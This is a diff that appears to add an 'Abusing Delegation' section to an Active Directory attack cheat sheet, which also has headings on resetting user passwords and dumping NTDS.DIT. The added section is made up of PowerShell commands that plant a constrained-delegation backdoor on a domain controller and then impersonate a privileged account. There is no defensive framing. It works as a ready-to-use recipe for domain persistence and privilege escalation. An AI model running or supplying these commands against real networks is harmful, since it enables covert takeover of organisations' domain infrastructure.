@@ -110,6 +110,17 @@ Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credent
 ```
 
 ```
+## ABUSING DELEGATION
+```
+# configure the backdoor
+Get-ADComputer -Identity <ServiceA> | Set-ADAccountControl -TrustedToAuthForDelegation $true
+Set-ADComputer -Identity DC01 -Add @{'msDS-AllowedDelegationTo'=@('CIFS/DC01.corp')}
+
+# trigger the backdoor
+[Reflection::Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
+$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<DAgreat>')
+$idToImpersonate.Impersonate()
+```
 
 ## DUMP NTDS.DIT
 ```
